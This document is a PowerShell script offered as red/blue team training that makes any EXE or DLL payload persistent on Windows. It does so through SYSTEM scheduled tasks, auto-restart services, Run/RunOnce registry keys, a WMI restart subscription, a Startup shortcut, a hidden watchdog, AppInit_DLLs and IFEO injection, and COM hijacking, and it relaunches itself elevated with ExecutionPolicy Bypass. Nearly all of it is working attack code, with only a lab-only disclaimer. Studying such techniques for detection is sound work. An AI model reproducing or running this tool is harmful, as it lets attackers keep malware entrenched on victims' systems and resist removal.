<#
.SYNOPSIS
    "persist at all costs" – Windows Persistence for EXE/DLL (Red/Blue Team Training)

.DESCRIPTION
    This script establishes robust persistence for a specified EXE or DLL payload on a
    Windows system, with multiple methods that survive reboots and process termination.
    Methods are toggled via command-line flags. It attempts to achieve the highest possible
    privileges (e.g., running as SYSTEM or with high integrity) when executed as Administrator.

    INTENDED EXCLUSIVELY FOR LEGAL, AUTHORIZED SECURITY TRAINING ON ISOLATED LAB
    ENVIRONMENTS (e.g., HackTheBox Academy). Unauthorized use is prohibited.

.PARAMETER ExePath
    Path to the executable (.exe) to persist.

.PARAMETER DllPath
    Path to the DLL (.dll) to persist. Cannot be used together with -ExePath.

.PARAMETER All
    Enable all applicable persistence methods.

.PARAMETER ScheduledTask
    Create a Scheduled Task that runs at logon, at boot, and triggers every 5 minutes to restart if killed.
    (Requires elevation for SYSTEM-level triggers; otherwise user logon only.)

.PARAMETER Service
    Install as a Windows service (for EXE). For DLL, creates a service using rundll32 to host the DLL.

.PARAMETER Registry
    Add entries to Run/RunOnce registry keys (HKLM if elevated, else HKCU).

.PARAMETER WMI
    Create a permanent WMI Event Subscription that restarts the process when it is terminated.
    (Requires elevation.)

.PARAMETER Startup
    Place a shortcut in the current user's Startup folder.

.PARAMETER Watchdog
    Start a background PowerShell watchdog loop that continuously monitors and restarts the process.

.PARAMETER Elevate
    When creating persistence mechanisms, ensure they run with the highest available privileges
    (e.g., SYSTEM for services, highest run level for scheduled tasks). This is implied for all
    methods when the script is elevated.

.PARAMETER AppInit
    (DLL only) Register the DLL via AppInit_DLLs to be loaded into every user-mode process.
    Requires elevation and a reboot to take effect.

.PARAMETER IFEO
    (DLL only) Use Image File Execution Options to inject the DLL into a specific target process
    (e.g., explorer.exe) via Debugger or VerifierDlls. Requires elevation.

.PARAMETER ComHijack
    (DLL only) Attempt COM hijacking by replacing the InprocServer32 entry of a common CLSID
    with the payload DLL. Requires elevation.

.EXAMPLE
    .\persist-windows.ps1 -ExePath C:\tools\implant.exe -All

.EXAMPLE
    .\persist-windows.ps1 -DllPath C:\tools\payload.dll -ScheduledTask -Registry -WMI
#>

#Requires -Version 5.0
[CmdletBinding(DefaultParameterSetName = 'Exe')]
param(
    [Parameter(Mandatory = $true, ParameterSetName = 'Exe', Position = 0)]
    [ValidateScript({ Test-Path $_ -PathType Leaf })]
    [string]$ExePath,

    [Parameter(Mandatory = $true, ParameterSetName = 'Dll', Position = 0)]
    [ValidateScript({ Test-Path $_ -PathType Leaf })]
    [string]$DllPath,

    [Parameter(ParameterSetName = 'Exe')]
    [Parameter(ParameterSetName = 'Dll')]
    [switch]$All,

    [Parameter(ParameterSetName = 'Exe')]
    [Parameter(ParameterSetName = 'Dll')]
    [switch]$ScheduledTask,

    [Parameter(ParameterSetName = 'Exe')]
    [Parameter(ParameterSetName = 'Dll')]
    [switch]$Service,

    [Parameter(ParameterSetName = 'Exe')]
    [Parameter(ParameterSetName = 'Dll')]
    [switch]$Registry,

    [Parameter(ParameterSetName = 'Exe')]
    [Parameter(ParameterSetName = 'Dll')]
    [switch]$WMI,

    [Parameter(ParameterSetName = 'Exe')]
    [Parameter(ParameterSetName = 'Dll')]
    [switch]$Startup,

    [Parameter(ParameterSetName = 'Exe')]
    [Parameter(ParameterSetName = 'Dll')]
    [switch]$Watchdog,

    [Parameter(ParameterSetName = 'Exe')]
    [Parameter(ParameterSetName = 'Dll')]
    [switch]$Elevate,

    # DLL-specific parameters
    [Parameter(ParameterSetName = 'Dll')]
    [switch]$AppInit,

    [Parameter(ParameterSetName = 'Dll')]
    [switch]$IFEO,

    [Parameter(ParameterSetName = 'Dll')]
    [switch]$ComHijack
)

# ---------- Helper Functions ----------
function Write-Info {
    param([string]$Message)
    Write-Host "[+] $Message" -ForegroundColor Green
}

function Write-Warn {
    param([string]$Message)
    Write-Host "[-] WARNING: $Message" -ForegroundColor Yellow
}

function Write-Err {
    param([string]$Message)
    Write-Host "[!] ERROR: $Message" -ForegroundColor Red
}

function Test-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Invoke-Elevate {
    # Relaunch script as admin if not already elevated
    if (-not (Test-Admin)) {
        Write-Info "Attempting to restart with administrative privileges..."
        $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" " + $PSBoundParameters.GetEnumerator() | ForEach-Object {
            if ($_.Value -is [switch] -and $_.Value) {
                "-$($_.Key)"
            } elseif ($_.Value -is [string]) {
                "-$($_.Key) `"$($_.Value)`""
            }
        }
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = $arguments -join ' '
        $psi.Verb = "RunAs"
        $psi.UseShellExecute = $true
        try {
            [System.Diagnostics.Process]::Start($psi) | Out-Null
            exit 0
        } catch {
            Write-Err "Failed to elevate: $_"
            exit 1
        }
    }
}

# ---------- Persistence Methods ----------

function Install-ScheduledTask {
    param(
        [string]$Path,          # EXE or DLL path
        [bool]$IsDll = $false,
        [switch]$HighestRun     # run with highest privileges
    )
    Write-Info "Installing Scheduled Task persistence..."

    $taskName = "Persist_" + [System.IO.Path]::GetFileNameWithoutExtension($Path)
    $action = if ($IsDll) {
        New-ScheduledTaskAction -Execute "rundll32.exe" -Argument "`"$Path`",Start"
    } else {
        New-ScheduledTaskAction -Execute $Path
    }

    # Build triggers: at logon, at startup, and a repetition every 5 minutes
    $triggers = @()
    $triggers += New-ScheduledTaskTrigger -AtLogOn
    if (Test-Admin) {
        $triggers += New-ScheduledTaskTrigger -AtStartup
    }
    $repeatTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
    $triggers += $repeatTrigger

    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 10 -RestartInterval (New-TimeSpan -Minutes 1)
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    if (-not (Test-Admin)) {
        $principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) -LogonType Interactive -RunLevel Highest
    }

    $task = New-ScheduledTask -Action $action -Trigger $triggers -Settings $settings -Principal $principal
    try {
        Register-ScheduledTask -TaskName $taskName -InputObject $task -Force | Out-Null
        Write-Info "Scheduled Task '$taskName' created."
    } catch {
        Write-Warn "Failed to create Scheduled Task: $_"
    }
}

function Install-Service {
    param(
        [string]$Path,
        [bool]$IsDll = $false
    )
    Write-Info "Installing Windows Service persistence..."
    if (-not (Test-Admin)) {
        Write-Warn "Service installation requires Administrator privileges; skipping."
        return
    }

    $svcName = "Persist_" + [System.IO.Path]::GetFileNameWithoutExtension($Path)
    $binPath = if ($IsDll) {
        "C:\Windows\System32\rundll32.exe `"$Path`",Start"
    } else {
        "`"$Path`""
    }

    try {
        # Ensure sc.exe is available
        $sc = Get-Command sc.exe -ErrorAction Stop
        & $sc create $svcName binPath= $binPath start= auto obj= LocalSystem | Out-Null
        & $sc description $svcName "Persistence service for training" | Out-Null
        & $sc failure $svcName reset= 86400 actions= restart/60000/restart/60000/restart/60000 | Out-Null
        Start-Service $svcName -ErrorAction SilentlyContinue
        Write-Info "Service '$svcName' created and started."
    } catch {
        Write-Warn "Failed to create service: $_"
    }
}

function Install-Registry {
    param(
        [string]$Path,
        [bool]$IsDll = $false
    )
    Write-Info "Installing Registry Run key persistence..."

    $entryName = "Persist_" + [System.IO.Path]::GetFileNameWithoutExtension($Path)
    $entryValue = if ($IsDll) {
        "rundll32.exe `"$Path`",Start"
    } else {
        "`"$Path`""
    }

    if (Test-Admin) {
        $keys = @(
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce"
        )
    } else {
        $keys = @("HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                  "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce")
    }

    foreach ($key in $keys) {
        try {
            New-ItemProperty -Path $key -Name $entryName -Value $entryValue -PropertyType String -Force | Out-Null
            Write-Info "Registry entry added to $key."
        } catch {
            Write-Warn "Failed to write to $key : $_"
        }
    }
}

function Install-WMI {
    param(
        [string]$Path,
        [bool]$IsDll = $false
    )
    Write-Info "Installing WMI Event Subscription persistence..."
    if (-not (Test-Admin)) {
        Write-Warn "WMI persistence requires Administrator privileges; skipping."
        return
    }

    $filterName = "PersistFilter_" + [System.IO.Path]::GetFileNameWithoutExtension($Path)
    $consumerName = "PersistConsumer_" + [System.IO.Path]::GetFileNameWithoutExtension($Path)
    $bindingName = "PersistBinding_" + [System.IO.Path]::GetFileNameWithoutExtension($Path)

    # Command to restart the process
    $command = if ($IsDll) {
        "cmd.exe /c start /min rundll32.exe `"$Path`",Start"
    } else {
        "cmd.exe /c start /min `"$Path`""
    }

    # Query for process termination events (ID 4689 in Security log, or use __InstanceDeletionEvent of Win32_Process)
    # More reliable: use __InstanceDeletionEvent for the specific process name.
    $processName = [System.IO.Path]::GetFileName($Path)
    $query = "SELECT * FROM __InstanceDeletionEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = '$processName'"

    try {
        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
            Name = $filterName
            EventNameSpace = 'root\cimv2'
            QueryLanguage = 'WQL'
            Query = $query
        } -ErrorAction Stop

        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
            Name = $consumerName
            CommandLineTemplate = $command
        } -ErrorAction Stop

        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
            Filter = $filter
            Consumer = $consumer
        } -ErrorAction Stop | Out-Null

        Write-Info "WMI event subscription created."
    } catch {
        Write-Warn "Failed to create WMI subscription: $_"
    }
}

function Install-Startup {
    param(
        [string]$Path,
        [bool]$IsDll = $false
    )
    Write-Info "Installing Startup folder shortcut..."

    $startupDir = [Environment]::GetFolderPath('Startup')
    $shortcutName = "Persist_" + [System.IO.Path]::GetFileNameWithoutExtension($Path) + ".lnk"
    $shortcutPath = Join-Path $startupDir $shortcutName

    $target = if ($IsDll) {
        "C:\Windows\System32\rundll32.exe"
    } else {
        $Path
    }
    $arguments = if ($IsDll) {
        "`"$Path`",Start"
    } else {
        ""
    }

    $WshShell = New-Object -ComObject WScript.Shell
    $shortcut = $WshShell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = $target
    if ($arguments) {
        $shortcut.Arguments = $arguments
    }
    $shortcut.WorkingDirectory = Split-Path $Path -Parent
    $shortcut.Save()
    Write-Info "Shortcut placed in Startup folder."
}

function Start-Watchdog {
    param(
        [string]$Path,
        [bool]$IsDll = $false
    )
    Write-Info "Starting background watchdog loop..."

    $processName = [System.IO.Path]::GetFileName($Path)
    $watchdogBlock = {
        param($procName, $exePath, $isDll)
        while ($true) {
            $proc = Get-Process -Name $procName -ErrorAction SilentlyContinue
            if (-not $proc) {
                if ($isDll) {
                    Start-Process rundll32.exe -ArgumentList "`"$exePath`",Start" -WindowStyle Hidden
                } else {
                    Start-Process $exePath -WindowStyle Hidden
                }
            }
            Start-Sleep -Seconds 5
        }
    }

    $job = Start-Job -ScriptBlock $watchdogBlock -ArgumentList $processName, $Path, $IsDll
    Write-Info "Watchdog started as job ID $($job.Id)."
}

function Enable-ElevatedPrivileges {
    # For methods like Scheduled Tasks, we already use RunLevel=Highest.
    # Additional: if DLL, try to set it to load in high-integrity processes.
    Write-Info "Ensuring highest privileges for persistence mechanisms..."
    # Placeholder: In a real scenario, you might set service to interact with desktop, etc.
    # For training, this is handled per-method.
}

# ---------- DLL-Specific Methods ----------

function Install-AppInit {
    param([string]$Dll)
    Write-Info "Installing AppInit_DLLs persistence..."
    if (-not (Test-Admin)) {
        Write-Warn "AppInit_DLLs requires Administrator; skipping."
        return
    }
    try {
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
        $existing = Get-ItemProperty -Path $regPath -Name "AppInit_DLLs" -ErrorAction SilentlyContinue
        $newValue = if ($existing.AppInit_DLLs) { "$($existing.AppInit_DLLs),$Dll" } else { $Dll }
        Set-ItemProperty -Path $regPath -Name "AppInit_DLLs" -Value $newValue -Type String -Force
        # Also set LoadAppInit_DLLs to 1
        Set-ItemProperty -Path $regPath -Name "LoadAppInit_DLLs" -Value 1 -Type DWord -Force
        Write-Info "AppInit_DLLs set. Reboot required for full effect."
    } catch {
        Write-Warn "Failed to set AppInit_DLLs: $_"
    }
}

function Install-IFEO {
    param(
        [string]$Dll,
        [string]$TargetProcess = "explorer.exe"   # Common host for injection
    )
    Write-Info "Installing IFEO Debugger persistence for $TargetProcess..."
    if (-not (Test-Admin)) {
        Write-Warn "IFEO requires Administrator; skipping."
        return
    }
    try {
        $ifeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$TargetProcess"
        if (-not (Test-Path $ifeoPath)) {
            New-Item -Path $ifeoPath -Force | Out-Null
        }
        # Using VerifierDlls to load the DLL when the process starts (Windows 10+)
        Set-ItemProperty -Path $ifeoPath -Name "VerifierDlls" -Value $Dll -Type String -Force
        Write-Info "IFEO VerifierDlls set for $TargetProcess."
    } catch {
        Write-Warn "Failed to set IFEO: $_"
    }
}

function Install-ComHijack {
    param([string]$Dll)
    Write-Info "Attempting COM hijacking..."
    if (-not (Test-Admin)) {
        Write-Warn "COM hijacking typically requires Administrator; skipping."
        return
    }
    # This is a simplified demonstration; real COM hijacking targets specific CLSIDs.
    # Here we'll use a known overlooked CLSID that loads user32.dll (just an example).
    # In practice, you'd replace a legitimate COM server DLL.
    try {
        $clsid = "{A4B52A56-D2C4-4BD2-BA56-2D2C4BDA5642}"  # Example CLSID for illustration
        $comPath = "HKLM:\SOFTWARE\Classes\CLSID\$clsid\InprocServer32"
        if (-not (Test-Path $comPath)) {
            New-Item -Path $comPath -Force | Out-Null
        }
        Set-ItemProperty -Path $comPath -Name "(default)" -Value $Dll -Type String -Force
        Set-ItemProperty -Path $comPath -Name "ThreadingModel" -Value "Both" -Type String -Force
        Write-Info "COM hijack set for CLSID $clsid."
    } catch {
        Write-Warn "COM hijack failed: $_"
    }
}

# ---------- Main Execution ----------

# Validate parameters
if ($PSCmdlet.ParameterSetName -eq 'Exe') {
    $Path = $ExePath
    $IsDll = $false
} else {
    $Path = $DllPath
    $IsDll = $true
}

# Ensure absolute path
$Path = (Resolve-Path $Path).Path

# If --All is used, enable every method
if ($All) {
    $ScheduledTask = $true
    $Service = $true
    $Registry = $true
    $WMI = $true
    $Startup = $true
    $Watchdog = $true
    if ($IsDll) {
        $AppInit = $true
        $IFEO = $true
        $ComHijack = $true
    }
}

# Attempt to elevate if any method requires admin
$needsAdmin = $false
if ($Service -or $WMI -or $AppInit -or $IFEO -or $ComHijack) {
    $needsAdmin = $true
}

if ($needsAdmin -and -not (Test-Admin)) {
    Invoke-Elevate
}

# Display status
Write-Info "Persistence installation starting..."
Write-Info "Payload: $Path"
Write-Info "Running as: $([Environment]::UserDomainName)\$([Environment]::UserName) ($(if (Test-Admin) {'Administrator'} else {'User'}))"

# Execute requested methods
if ($ScheduledTask) {
    Install-ScheduledTask -Path $Path -IsDll $IsDll -HighestRun
}
if ($Service) {
    Install-Service -Path $Path -IsDll $IsDll
}
if ($Registry) {
    Install-Registry -Path $Path -IsDll $IsDll
}
if ($WMI) {
    Install-WMI -Path $Path -IsDll $IsDll
}
if ($Startup) {
    Install-Startup -Path $Path -IsDll $IsDll
}
if ($Watchdog) {
    Start-Watchdog -Path $Path -IsDll $IsDll
}
if ($Elevate) {
    Enable-ElevatedPrivileges
}

# DLL-only methods
if ($IsDll) {
    if ($AppInit) { Install-AppInit -Dll $Path }
    if ($IFEO) { Install-IFEO -Dll $Path }
    if ($ComHijack) { Install-ComHijack -Dll $Path }
}

Write-Info "Persistence deployment completed."
